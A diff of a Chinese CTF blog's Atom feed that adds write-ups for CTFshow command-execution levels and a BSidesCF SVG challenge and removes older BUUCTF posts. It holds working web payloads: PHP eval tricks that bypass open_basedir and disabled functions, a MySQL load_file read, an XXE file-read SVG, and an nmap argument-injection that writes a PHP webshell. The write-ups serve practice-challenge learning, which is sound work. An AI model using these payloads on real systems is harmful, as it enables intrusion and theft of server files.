@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://Ro1ing.github.io</id>
     <title>Ro1ing</title>
-    <updated>2021-05-30T12:30:27.978Z</updated>
+    <updated>2021-06-07T13:29:38.452Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://Ro1ing.github.io"/>
     <link rel="self" href="https://Ro1ing.github.io/atom.xml"/>
@@ -10,6 +10,248 @@
     <logo>https://Ro1ing.github.io/images/avatar.png</logo>
     <icon>https://Ro1ing.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, Ro1ing</rights>
+    <entry>
+        <title type="html"><![CDATA[CTFshow Web入门 命令执行篇]]></title>
+        <id>https://Ro1ing.github.io/post/ctfshow-web-ru-men-ming-ling-zhi-xing-pian/</id>
+        <link href="https://Ro1ing.github.io/post/ctfshow-web-ru-men-ming-ling-zhi-xing-pian/">
+        </link>
+        <updated>2021-06-07T13:27:19.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="web66">web66</h2>
+<pre><code>c=print_r(scandir('/'));
+</code></pre>
+<p>回显</p>
+<pre><code>Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; .dockerenv [3] =&gt; bin [4] =&gt; dev [5] =&gt; etc [6] =&gt; flag.txt [7] =&gt; home [8] =&gt; lib [9] =&gt; media [10] =&gt; mnt [11] =&gt; opt [12] =&gt; proc [13] =&gt; root [14] =&gt; run [15] =&gt; sbin [16] =&gt; srv [17] =&gt; sys [18] =&gt; tmp [19] =&gt; usr [20] =&gt; var )
+</code></pre>
+<pre><code>c=highlight_file('/flag.txt');
+</code></pre>
+<p>得到flag<br>
+也可以使用文件包含</p>
+<pre><code>c=include('/flag.txt');
+c=require('/flag.txt');
+c=require_once('/flag.txt');
+</code></pre>
+<blockquote>
+<p>require_once()语句在脚本执行期间包含并运行指定文件(通俗一点，括号内的文件会执行一遍)。此行为和require()语句类似，唯一区别是如果该文件中的代码已经被包含了，则不会再次包含</p>
+</blockquote>
+<h2 id="web67">Web67</h2>
+<pre><code>c=highlight_file('/flag.txt');
+</code></pre>
+<h2 id="web68">Web68</h2>
+<pre><code>c=include('flag.php');echo $flag;
+秀秀得了不在这
+扫下根目录
+c=print_r(scandir('/'));
+print_r也被过滤了
+换方法
+c=var_dump(scandir('/'));
+</code></pre>
+<p>获得根目录 发现.txt</p>
+<pre><code>array(21) { [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(10) &quot;.dockerenv&quot; [3]=&gt; string(3) &quot;bin&quot; [4]=&gt; string(3) &quot;dev&quot; [5]=&gt; string(3) &quot;etc&quot; [6]=&gt; string(8) &quot;flag.txt&quot; [7]=&gt; string(4) &quot;home&quot; [8]=&gt; string(3) &quot;lib&quot; [9]=&gt; string(5) &quot;media&quot; [10]=&gt; string(3) &quot;mnt&quot; [11]=&gt; string(3) &quot;opt&quot; [12]=&gt; string(4) &quot;proc&quot; [13]=&gt; string(4) &quot;root&quot; [14]=&gt; string(3) &quot;run&quot; [15]=&gt; string(4) &quot;sbin&quot; [16]=&gt; string(3) &quot;srv&quot; [17]=&gt; string(3) &quot;sys&quot; [18]=&gt; string(3) &quot;tmp&quot; [19]=&gt; string(3) &quot;usr&quot; [20]=&gt; string(3) &quot;var&quot; }
+</code></pre>
+<pre><code>c=include(&quot;/flag.txt&quot;);//得到；没有php标签 所以使用html形式输出
+</code></pre>
+<h2 id="web69">Web69</h2>
+<pre><code>c=include(&quot;/flag.txt&quot;);
+</code></pre>
+<h2 id="web70">Web70</h2>
+<pre><code>Warning: error_reporting() has been disabled for security reasons in /var/www/html/index.php on line 14
+
+Warning: ini_set() has been disabled for security reasons in /var/www/html/index.php on line 15
+
+Warning: highlight_file() has been disabled for security reasons in /var/www/html/index.php on line 21
+你要上天吗？
+</code></pre>
+<pre><code>c=include('/flag.txt');
+</code></pre>
+<h2 id="web71">Web71</h2>
+<p>看index.php</p>
+<pre><code>&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+ini_set('display_errors', 0);
+// 你们在炫技吗？
+if(isset($_POST['c'])){
+        $c= $_POST['c'];
+        eval($c);
+        $s = ob_get_contents();//得到输出缓冲区内容
+        ob_end_clean();//清空缓冲区
+        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);//对内容进行一个替换
+}else{
+    highlight_file(__FILE__);
+}
+
+?&gt;
+
+你要上天吗？
+</code></pre>
+<p><img src="https://Ro1ing.github.io/post-images/1623072540529.jpg" alt="" loading="lazy"><br>
+思路：在ob_get_contents()函数之前中断指令。</p>
+<pre><code>c=include('/flag.txt');exit();
+</code></pre>
+<h2 id="web72">Web72</h2>
+<pre><code>c=var_dump(scandir('/'));exit();
+返回
+Warning: error_reporting() has been disabled for security reasons in /var/www/html/index.php on line 14
+Warning: ini_set() has been disabled for security reasons in /var/www/html/index.php on line 15
+Warning: scandir(): open_basedir restriction in effect. File(/) is not within the allowed path(s): (/var/www/html/) in /var/www/html/index.php(19) : eval()'d code on line 1
+Warning: scandir(/): failed to open dir: Operation not permitted in /var/www/html/index.php(19) : eval()'d code on line 1
+Warning: scandir(): (errno 1): Operation not permitted in /var/www/html/index.php(19) : eval()'d code on line 1
+Warning: var_dump() has been disabled for security reasons in /var/www/html/index.php(19) : eval()'d code on line 1
+</code></pre>
+<pre><code>c=var_dump(scandir('/'));
+
+???????: ?????_?????????() ??? ???? ???????? ??? ???????? ??????? ?? /???/???/????/?????.??? ?? ???? ?? ???????: ???_???() ??? ???? ???????? ??? ???????? ??????? ?? /???/???/????/?????.??? ?? ???? ?? ???????: ???????(): ????_??????? ??????????? ?? ??????. ????(/) ?? ??? ?????? ??? ??????? ????(?): (/???/???/????/) ?? /???/???/????/?????.???(??) : ????()'? ???? ?? ???? ? ???????: ???????(/): ?????? ?? ???? ???: ????????? ??? ????????? ?? /???/???/????/?????.???(??) : ????()'? ???? ?? ???? ? ???????: ???????(): (????? ?): ????????? ??? ????????? ?? /???/???/????/?????.???(??) : ????()'? ???? ?? ???? ? ???????: ???_????() ??? ???? ???????? ??? ???????? ??????? ?? /???/???/????/?????.???(??) : ????()'? ???? ?? ???? ? 你要上天吗？
+</code></pre>
+<p>查询不到根目录内容 发现很多函数都不能用了</p>
+<pre><code>c=$a = &quot;glob:///*.txt&quot;;//根目录下所有txt
+if($b = opendir($a)){
+ while (($file = readdir($b))!== false) {//循环读取
+  echo &quot;filename:&quot;.$file.&quot;\n&quot;;
+}
+closedir($b);//关闭
+}
+exit();
+</code></pre>
+<p>回显</p>
+<pre><code>Warning: error_reporting() has been disabled for security reasons in /var/www/html/index.php on line 14
+Warning: ini_set() has been disabled for security reasons in /var/www/html/index.php on line 15
+filename:flag0.txt
+</code></pre>
+<p>然后采用脚本绕过<br>
+72poc.php ctfshow群里有<br>
+选中c后面的内容然后点击url编码<br>
+<img src="assets/image-20210510210830-4ytgdcv.png" alt="" loading="lazy"><br>
+这个脚本是国外的开源项目</p>
+<h2 id="web73">Web73</h2>
+<p>使用脚本</p>
+<pre><code>Warning: strlen() has been disabled for security reasons in /var/www/html/index.php(19) : eval()'d code on line 154
+Warning: strlen() has been disabled for security reasons in /var/www/html/index.php(19) : eval()'d code on line 154
+UAF failed
+</code></pre>
+<p>strlen()函数被过滤<br>
+使用自定函数代替</p>
+<pre><code>&lt;?php
+//strlen // 返回指定字符串的长度
+
+function strlen_user($s) {
+	return count(str_split($s));
+}
+
+echo strlen_user('abc');
+
+?&gt;
+</code></pre>
+<p>写入poc 将 所有的strlen替换成strlen_user<br>
+将其提交回显：</p>
+<pre><code>Fatal error: Possible integer overflow in memory allocation (4162900904 * 32 + 32) in /var/www/html/index.php(19) : eval()'d code on line 30
+</code></pre>
+<p>内存溢出<br>
+重新扫描一下可能读取的文件有问题</p>
+<pre><code>c=$a = &quot;glob:///*.txt&quot;;//根目录下所有txt
+if($b = opendir($a)){
+ while (($file = readdir($b))!== false) {//循环读取
+  echo &quot;filename:&quot;.$file.&quot;\n&quot;;
+}
+closedir($b);//关闭
+}
+exit();
+#filename:flagc.txt
+</code></pre>
+<p>改一下<br>
+还是产生溢出</p>
+<pre><code>&lt;?php
+//strlen // 返回指定字符串的长度
+
+function strlen_user($s) {
+    $rot=0;
+    for ($i=0;$i&lt;100000;$i++){
+        if($s[$i]){
+            $ret=$ret+1;
+        }
+        else{
+            break;
+        }
+    }
+        return $ret;
+}
+
+?&gt;
+</code></pre>
+<p>替换；报错状态码502；题目流量被清洗了 题目问题。</p>
+<h2 id="web74">Web74</h2>
+<p>先查看当前目录文件<br>
+根目录下 filename:flagx.txt</p>
+<pre><code>c=include(&quot;/flagx.txt&quot;);exit();
+</code></pre>
+<h2 id="web75">Web75</h2>
+<p>先使用 ((20210512195233-q5lu0du &quot;{{.text}}&quot;))</p>
+<blockquote>
+<p>filename:flag36.txt</p>
+</blockquote>
+<pre><code>```c=include(&quot;/flag36.txt&quot;);exit();
+</code></pre>
+<p>被拦截了<br>
+Payload:</p>
+<pre><code>try { $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root'); foreach ($dbh-&gt;query('select load_file(&quot;/flag36.txt&quot;)') as $row) { echo ($row[0]) . &quot;|&quot;; } $dbh = null;
+} catch (PDOException $e) { echo $e-&gt;getMessage(); exit(0);
+}
+exit(0);
+</code></pre>
+<p>数据库的连接是<strong>读配置文件</strong>得到的<br>
+拿SQL语句来读文件绕过open_basedir和disable_function的姿势</p>
+<h2 id="web76">Web76</h2>
+<blockquote>
+<p>filename:flag36d.txt</p>
+</blockquote>
+<pre><code>c=try { $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root'); foreach ($dbh-&gt;query('select load_file(&quot;/flag36d.txt&quot;)') as $row) { echo ($row[0]) . &quot;|&quot;; } $dbh = null;
+} catch (PDOException $e) { echo $e-&gt;getMessage(); exit(0);
+}
+exit(0);
+</code></pre>
+<p>得到</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[BSidesCF 2019]SVGMagic]]></title>
+        <id>https://Ro1ing.github.io/post/bsidescf-2019svgmagic/</id>
+        <link href="https://Ro1ing.github.io/post/bsidescf-2019svgmagic/">
+        </link>
+        <updated>2021-06-02T07:57:19.000Z</updated>
+        <content type="html"><![CDATA[<p>参考：https://www.rootnetsec.com/bsidessf-svgmagick/<br>
+文件上传<br>
+Convert SVG to PNG with Magic<br>
+上传Png：</p>
+<pre><code>Internal Server Error
+The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.
+</code></pre>
+<p>上传Svg：<br>
+回显Svg源文件和转化后的png<br>
+利用SVG任意读取本地文件</p>
+<blockquote>
+<p>/proc/self 表示本地当前路径</p>
+</blockquote>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE note [
+&lt;!ENTITY file SYSTEM &quot;file:///proc/self/cwd/flag.txt&quot; &gt;
+]&gt;
+&lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt;
+  &lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;
+&lt;/svg&gt;
+</code></pre>
+<p>得到</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[BUUCTF Misc题]]></title>
         <id>https://Ro1ing.github.io/post/buuctf-misc-/</id>
@@ -615,228 +857,6 @@ for w in range(n):#高和宽一起爆破
 <p>在副本添加文件头</p>
 <p><img src="%E9%B8%A1%E4%BD%A0%E5%A4%AA%E7%BE%8E.png" alt="" loading="lazy"><br>
 <img src="https://Ro1ing.github.io/post-images/1611988993121.png" alt="" loading="lazy"></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[BUUCTF 2018]Online Tool]]></title>
-        <id>https://Ro1ing.github.io/post/buuctf-2018online-tool/</id>
-        <link href="https://Ro1ing.github.io/post/buuctf-2018online-tool/">
-        </link>
-        <updated>2021-01-30T06:41:39.000Z</updated>
-        <content type="html"><![CDATA[<p>代码审计php</p>
-<p><strong>escapeshellarg和escapeshellcmd使用不当导致rce</strong></p>
-<p>两个函数配合使用就会导致多个参数的注入。</p>
-<blockquote>
-<p>escapeshellarg和escapeshellcmd的功能</p>
-<p><strong>escapeshellarg</strong></p>
-<p>1.确保用户只传递一个参数给命令<br>
-2.用户不能指定更多的参数一个<br>
-3.用户不能执行不同的命令</p>
-<p><strong>escapeshellcmd</strong></p>
-<p>1.确保用户只执行一个命令<br>
-2.用户可以指定不限数量的参数<br>
-3.用户不能执行不同的命令</p>
-</blockquote>
-<p>关于escapeshellarg和escapeshellcmd使用不当导致rce</p>
-<p>在https://paper.seebug.org/164/有详解</p>
-<p>我们在这摘取</p>
-<blockquote>
-<ol>
-<li>传入的参数是：172.17.0.2' -v -d a=1</li>
-<li>经过escapeshellarg处理后变成了'172.17.0.2''' -v -d a=1'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li>
-<li>经过escapeshellcmd处理后变成'172.17.0.2'\'' -v -d a=1'，这是因为escapeshellcmd对\以及最后那个<strong>不配对儿</strong>的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php</li>
-<li>最后执行的命令是curl '172.17.0.2'\'' -v -d a=1'，由于中间的\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d     a=1'，即向172.17.0.2\发起请求，POST 数据为a=1'。</li>
-</ol>
-<p>回到mail中，我们的 payload 最终在执行时变成了'-fa'\''( -OQueueDirectory=/tmp -X/var/www/html/test.php )@a.com'，分割后就是-fa(、-OQueueDirectory=/tmp、-X/var/www/html/test.php、)@a.com'，最终的参数就是这样被注入的。</p>
-<p>使用escapeshellcmd / escapeshellarg时不可能执行第二个命令。</p>
-<p>但是我们仍然可以将参数传递给第一个命令。</p>
-<p>这意味着我们也可以将新选项传递给命令。</p>
-<p>利用漏洞的能力取决于目标可执行文件。</p>
-</blockquote>
-<pre><code class="language-php">&lt;?php
-
-if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
-}
-
-if(!isset($_GET['host'])) {
-    highlight_file(__FILE__);
-} else {
-    $host = $_GET['host'];
-    $host = escapeshellarg($host);
-    $host = escapeshellcmd($host);
-    $sandbox = md5(&quot;glzjin&quot;. $_SERVER['REMOTE_ADDR']);
-    echo 'you are in sandbox '.$sandbox;
-    @mkdir($sandbox);
-    chdir($sandbox);
-    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);
-}&gt; 
-</code></pre>
-<blockquote>
-<p>HTTP_X_FORWARDED_FOR获取到的IP地址</p>
-<p>REMOTE_ADDR代表着客户端的IP</p>
-<p>这两个都为比较常见的服务器获取ip</p>
-</blockquote>
-<blockquote>
-<p>echo system(“nmap -T5 -sT -Pn –host-timeout 2 -F “.$host);</p>
-</blockquote>
-<p>这有个system来执行命令有传参。</p>
-<p>本意是要输入ip参数来进行扫描，我们可以利用两个函数的漏洞，来过滤。</p>
-<p><strong>-oG</strong>可以实现将命令和结果写到文件</p>
-<p>payload可以通过写一个Shell到文件中</p>
-<p>由此构造payload：</p>
-<blockquote>
-<p>'<?php @eval($_POST["hack"]); ?> -oG hack.php '</p>
-</blockquote>
-<p>转化为：</p>
-<blockquote>
-<p>''[\''&lt;?php](file://''/ @eval($_POST[&quot;hack&quot;]); ?&gt; -oG hack.php '\'''</p>
-</blockquote>
-<p>输出为：</p>
-<blockquote>
-<p>&lt;?php @eval($_POST[hack]); ?&gt; -oG hack.php \</p>
-</blockquote>
-<p>菜刀连接即可</p>
-<p>参考链接：</p>
-<p>http://lz2y.top/index.php/2020/03/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-buuctf-2018online-tool/</p>
-<p>https://note.redmango.top/Online%20Tool(BUUCTF%202018)/</p>
-<p>https://paper.seebug.org/164/</p>
-<p>https://blog.csdn.net/qq_26406447/article/details/100711933</p>
-<p>https://blog.csdn.net/weixin_44077544/article/details/102835099</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[BUUCTFMisc基础]]></title>
-        <id>https://Ro1ing.github.io/post/buuctfmisc-ji-chu/</id>
-        <link href="https://Ro1ing.github.io/post/buuctfmisc-ji-chu/">
-        </link>
-        <updated>2021-01-30T06:38:43.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="金三胖"><strong>金三胖</strong></h2>
-<p>gif 使用fireworks 或其他 图像浏览软件 逐帧查看</p>
-<h2 id="二维码"><strong>二维码</strong></h2>
-<p>qr码扫下 没有意义 在十六进制编辑器中发现有文件</p>
-<p>使用 binwalk分离 4number.txt 和一个压缩包</p>
-<p>压缩包 4位数字爆破 获得</p>
-<h2 id="n种方法解决"><strong>N种方法解决</strong></h2>
-<p>base64图片 是一个二维码 还原 data:image/jpg base64</p>
-<h2 id="大白"><strong>大白</strong></h2>
-<p>图片明显修改过 宽高度被篡改</p>
-<p>使用TweakPNG</p>
-<blockquote>
-<p>Warning：</p>
-<p>Incorrect crc for IHDR chunk (is 6d7c7135, should be 8e14dfcf)</p>
-</blockquote>
-<p>使用十六进制编辑器修改</p>
-<p>回到图片 发现</p>
-<h2 id="基础破解"><strong>基础破解</strong></h2>
-<blockquote>
-<p>你一个压缩包，你并不能获得什么，因为他是四位数字加密的哈哈哈哈哈哈哈。。。不对==我说了什么了不得的东<br>
-西。。</p>
-</blockquote>
-<p>四位数字 直接爆破 得到base64解密</p>
-<h2 id="你竟然赶我走"><strong>你竟然赶我走</strong></h2>
-<p>十六进制的最后发现了</p>
-<h2 id="lsb"><strong>LSB</strong></h2>
-<p>stegsolve解析</p>
-<p><img src="LSB.png" alt="" loading="lazy"><br>
-<img src="https://Ro1ing.github.io/post-images/1611988768771.png" alt="" loading="lazy"><br>
-上面感觉有东西</p>
-<p>使用 zsteg 解密一下 无</p>
-<p>stegsolve 发现红黄蓝有字</p>
-<p><img src="LSB2.png" alt="" loading="lazy"><br>
-<img src="https://Ro1ing.github.io/post-images/1611988772613.png" alt="" loading="lazy"><br>
-生成图片 扫描获得</p>
-<h2 id="乌镇峰会种图"><strong>乌镇峰会种图</strong></h2>
-<p>十六进制的最后</p>
-<h2 id="ningen"><strong>ningen</strong></h2>
-<p>binwalk分离</p>
-<p>压缩包爆破四位数字 工具ziperello</p>
-<p>获得</p>
-<h2 id="rar"><strong>rar</strong></h2>
-<p>爆破4位</p>
-<h2 id="qr"><strong>qr</strong></h2>
-<p>扫码</p>
-<h2 id="文件中的秘密"><strong>文件中的秘密</strong></h2>
-<p>十六进制的中间 发现</p>
-<h2 id="镜子里面的世界"><strong>镜子里面的世界</strong></h2>
-<p>用stegsloves 分析</p>
-<p><img src="%E9%95%9C%E5%AD%90%E9%87%8C%E9%9D%A2%E7%9A%84%E4%B8%96%E7%95%8C.png" alt="" loading="lazy"><br>
-<img src="https://Ro1ing.github.io/post-images/1611988780681.png" alt="" loading="lazy"></p>
-<h2 id="小明的保险箱"><strong>小明的保险箱</strong></h2>
-<p>binwalk分离 四位密码爆破</p>
-<h2 id="爱因斯坦"><strong>爱因斯坦</strong></h2>
-<p>binwalk 图片备注中有 压缩包密码</p>
-<h2 id="假如给我三天光明"><strong>假如给我三天光明</strong></h2>
-<p>解盲文  😦   kmdonowg</p>
-<p>听摩斯电码 网上有摩斯电码的音频解析网站 当时是一点一点看的:(</p>
-<h2 id="wireshark"><strong>wireshark</strong></h2>
-<p>使用wireshark 找到那条http login流量中的数据包</p>
-<h2 id="easycap"><strong>easycap</strong></h2>
-<p>追踪 TCP流</p>
-<h2 id="被嗅探的流量"><strong>被嗅探的流量</strong></h2>
-<p>追踪 TCP流 流量包中发现</p>
-<h2 id="flag"><strong>FLAG</strong></h2>
-<p>stegsloves</p>
-<p><img src="FLAG.png" alt="" loading="lazy"><br>
-<img src="https://Ro1ing.github.io/post-images/1611988789645.png" alt="" loading="lazy"><br>
-文件头是 zip</p>
-<p>里面一个二进制文件</p>
-<p>使用kali strings</p>
-<p><img src="FLAG2.png" alt="" loading="lazy"><br>
-<img src="https://Ro1ing.github.io/post-images/1611988793153.png" alt="" loading="lazy"></p>
-<h2 id="另一个世界"><strong>另一个世界</strong></h2>
-<p>十六进制最后一串二进制 转ascii码 得到 koekj3s</p>
-<h2 id="荷兰宽带数据泄露"><strong>荷兰宽带数据泄露</strong></h2>
-<p>下载附件得到一个conf.bin文件，路由器信息数据，一般包含账号密码。题目并没有提示flag是什么，猜测是账号或者密码加上格式为最终flag。</p>
-<p>用RouterPassView查看后，搜索username或者password，最后发现是用户名</p>
-<h2 id="来首歌吧"><strong>来首歌吧</strong></h2>
-<p>右耳道摩斯密码</p>
-<h2 id="隐藏的钥匙"><strong>隐藏的钥匙</strong></h2>
-<p>十六进制内</p>
-<h2 id="后门查杀"><strong>后门查杀</strong></h2>
-<p>include下发现include.php为webshell文件</p>
-<p><img src="%E5%90%8E%E9%97%A8%E6%9F%A5%E6%9D%80.png" alt="" loading="lazy"><br>
-<img src="https://Ro1ing.github.io/post-images/1611988801371.png" alt="" loading="lazy"><br>
-<img src="%E5%90%8E%E9%97%A8%E6%9F%A5%E6%9D%802.png" alt="" loading="lazy"><br>
-<img src="https://Ro1ing.github.io/post-images/1611988804693.png" alt="" loading="lazy"></p>
-<h2 id="梅花香自苦寒来"><strong>梅花香自苦寒来</strong></h2>
-<h2 id="snake"><strong>snake</strong></h2>
-<p>binwalk 分离 将key中字符串解密</p>
-<p><img src="snake.png" alt="" loading="lazy"><br>
-<img src="https://Ro1ing.github.io/post-images/1611988808332.png" alt="" loading="lazy"><br>
-Serpent 有蛇的意思在西方神话是一条巨大的蛇型恶魔</p>
-<p>anaconda</p>
-<h2 id="神秘龙卷风"><strong>神秘龙卷风</strong></h2>
-<p>压缩包 四位数字爆破 Brainfuck和Ook加解密</p>
-<p>https://tool.bugku.com/brainfuck/</p>
-<h2 id="面具下的-flag"><strong>面具下的 flag</strong></h2>
-<p>Brainfuck和Ook加解密</p>
-<h2 id="webshell后门"><strong>webshell后门</strong></h2>
-<p><img src="webshell%E5%90%8E%E9%97%A8.png" alt="" loading="lazy"><br>
-<img src="https://Ro1ing.github.io/post-images/1611988814827.png" alt="" loading="lazy"></p>
-<h2 id="被劫持的神秘礼物"><strong>被劫持的神秘礼物</strong></h2>
-<p>小明收到了一件很特别的礼物，有奇怪的后缀，奇怪的名字和格式。小明找到了知心姐姐度娘，度娘好像知道这是啥，但是度娘也不知道里面是啥。。。你帮帮小明？找到帐号密码，串在一起，用32位小写MD5哈希一下得到的就是答案。</p>
-<p>wireshark http数据</p>
-<p><img src="%E8%A2%AB%E5%8A%AB%E6%8C%81%E7%9A%84%E7%A5%9E%E7%A7%98%E7%A4%BC%E7%89%A9.png" alt="" loading="lazy"><br>
-<img src="https://Ro1ing.github.io/post-images/1611988818695.png" alt="" loading="lazy"><br>
-拼接用户名密码得到adminaadminb</p>
-<p>使用md5加密后得到1d240aafe21a86afc11f38a45b541a49</p>
-<h2 id="刷新过的图片"><strong>刷新过的图片</strong></h2>
-<p>F5隐写</p>
-<p><img src="%E5%88%B7%E6%96%B0%E8%BF%87%E7%9A%84%E5%9B%BE%E7%89%87.png" alt="" loading="lazy"><br>
-<img src="https://Ro1ing.github.io/post-images/1611988824852.png" alt="" loading="lazy"><br>
-kali中 java Extract Misc.jpg</p>
-<p>解密出一个伪加密的压缩包</p>
-<h2 id="穿越时空的思念"><strong>穿越时空的思念</strong></h2>
-<p>摩斯电码</p>
-<h2 id="秘密文件"><strong>秘密文件</strong></h2>
-<p>binwalk分离文件 爆破密码</p>
-<h2 id="我吃三明治"><strong>我吃三明治</strong></h2>
-<p>一张图片</p>
-<p>使用foremost 解出两张图片</p>
-<p>看wp说是 在两张图片连接处 有类似与base32的字符串</p>
-<p><img src="%E6%88%91%E5%90%83%E4%B8%89%E6%98%8E%E6%B2%BB.png" alt="" loading="lazy"><br>
-<img src="https://Ro1ing.github.io/post-images/1611988838291.png" alt="" loading="lazy"></p>
 ]]></content>
     </entry>
 </feed>
